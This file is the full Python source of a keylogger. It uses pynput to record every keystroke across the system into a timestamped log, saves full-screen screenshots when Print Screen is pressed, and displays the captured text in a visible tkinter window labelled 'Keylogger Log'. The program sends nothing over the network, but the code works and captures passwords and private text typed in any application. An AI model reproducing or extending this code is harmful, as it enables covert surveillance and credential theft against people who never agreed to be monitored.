import os
from datetime import datetime
from pynput import keyboard
import tkinter as tk
from PIL import ImageGrab
import time

def main():
    # Specify the name of the file (can be changed)
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    screenshot_interval = 10  # Ekran görüntüsü alma aralığı (saniye cinsinden)

    last_screenshot_time = time.time()

    def on_key_press(key):
        nonlocal text_widget, last_screenshot_time

        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(f"{key.char}")
            else:
                f.write(f"{key}")

        # Ekran görüntüsü alma kontrolü
        if key == keyboard.Key.print_screen:
            take_screenshot()

        # Update the text widget with the latest log entry
        with open(log_file, "r") as f:
            log_text = f.read()
        text_widget.configure(state="normal")
        text_widget.delete("1.0", tk.END)
        text_widget.insert(tk.END, log_text)
        text_widget.configure(state="disabled")
        text_widget.see(tk.END)

    def take_screenshot():
        nonlocal last_screenshot_time
        current_time = time.time()
        if current_time - last_screenshot_time >= screenshot_interval:
            screenshot_folder = os.path.join(os.getcwd(), "screenshots")
            if not os.path.exists(screenshot_folder):
                os.makedirs(screenshot_folder)
            screenshot_file = os.path.join(screenshot_folder, f'{datetime.now().strftime("%d-%m-%Y|%H:%M:%S")}.png')
            ImageGrab.grab().save(screenshot_file)
            last_screenshot_time = current_time

    # Create a listener
    listener = keyboard.Listener(on_press=on_key_press)

    try:
        listener.start()  # Start the listener

        # Create a tkinter window to display the log in real-time
        window = tk.Tk()
        window.title("Keylogger Log")
        window.geometry("600x400")
        window.configure(bg="white")

        text_widget = tk.Text(window, state="disabled", bg="white")
        text_widget.pack(fill=tk.BOTH, expand=True)

        window.mainloop()

    except Exception as ex:
        print(f"Error while catching events: {ex}")

        with open(log_file, "a") as f:
            f.write(f"\nError: {ex}")


if __name__ == "__main__":
    main()
